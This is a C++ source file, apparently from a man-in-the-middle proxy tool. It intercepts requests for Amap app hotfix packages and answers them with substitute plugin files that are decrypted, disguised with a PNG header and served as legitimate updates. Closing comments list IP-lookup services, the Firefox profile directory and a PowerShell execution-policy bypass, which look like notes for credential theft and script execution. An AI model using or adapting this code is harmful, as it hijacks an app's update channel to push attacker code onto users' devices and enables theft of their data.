#include "AmapHotfix.h"
#include "PluginServer.h"
#include "../Public.h"
#include "../FileOper.h"

int gAmapFlag = 0;

int AmapHotfix::isAmapHotfix(const char * url, const char * host) {

	if (strstr(host, "a.amap.com") && strstr(url, "/lbs/static/unzip/co/armeabi/co_"))
	{
		gAmapFlag = 2;
		return TRUE;
	}else if (strstr(host, "pub.aliyun-inc.com") && strstr(url,"/amap-api/comm/upload/aiu_"))
	{
		gAmapFlag = 1;
		return TRUE;
	}

	return FALSE;
}


unsigned char gAmapPngHdr[32] = {
	0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
	0x00, 0x00, 0x04, 0x94, 0x00, 0x00, 0x01, 0xB2, 0x08, 0x06, 0x00, 0x00, 0x00, 0xB2, 0x00, 0x00
};


int makePngFile(string filename, string dstfilename) {
	int ret = 0;

	char * lpsrc = 0;
	int srcfs = 0;
	ret = FileOper::fileDecryptReader(filename.c_str(), &lpsrc, &srcfs);
	if (srcfs <= 0)
	{
		return FALSE;
	}

	HANDLE hfdst = CreateFileA(dstfilename.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hfdst == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD dwcnt = 0;

	ret = WriteFile(hfdst, gAmapPngHdr, 32, &dwcnt, 0);

// 	HANDLE hfsrc = CreateFileA(filename.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
// 		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
// 	if (hfsrc == INVALID_HANDLE_VALUE)
// 	{
// 		CloseHandle(hfdst);
// 		return FALSE;
// 	}
// 	int srcfs = GetFileSize(hfsrc, 0);
// 	char * lpsrc = new char[srcfs];
// 	ret = ReadFile(hfsrc, lpsrc, srcfs, &dwcnt, 0);
// 	CloseHandle(hfsrc);

	ret = WriteFile(hfdst, lpsrc, srcfs, &dwcnt, 0);
	CloseHandle(hfdst);

	return TRUE;
}

int AmapHotfix::replyAmapHotfixPlugin(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = 0;
	string hotfix1 = "amap_hotfix1.zip";
	string hotfix2 = "amap_hotfix2.zip";
	string hotfixfn = "";
	string hotfixplatfn = "";
	if (gAmapFlag == 1)
	{
		hotfixfn = hotfix1;

	}else if (gAmapFlag == 2)
	{
		hotfixfn = hotfix2;
	}

	hotfixplatfn = hotfixfn + "_new";

	string pluginfn = Public::getUserPluginPath(lphttp->username) + hotfixfn;
	string platfn   = Public::getUserPluginPath(lphttp->username) + hotfixplatfn;

	ret = makePngFile(pluginfn, platfn);
	if (ret <= 0)
	{
		return FALSE;
	}
	char * szFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lphttp->username, hotfixplatfn);
	ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szFormat, 1);
	return ret;
}

//ªÒ»°ipµÿ÷∑
//http://icanhazip.com/
//http://api.ipify.org/

//ENV_APPDATA +"\\mozilla\\firefox\\Profiles\\"
//powershell -ExecutionPolicy -Unrestricted -File "xxx" 
//powershell -ep -Unrestricted -f "xxx" 
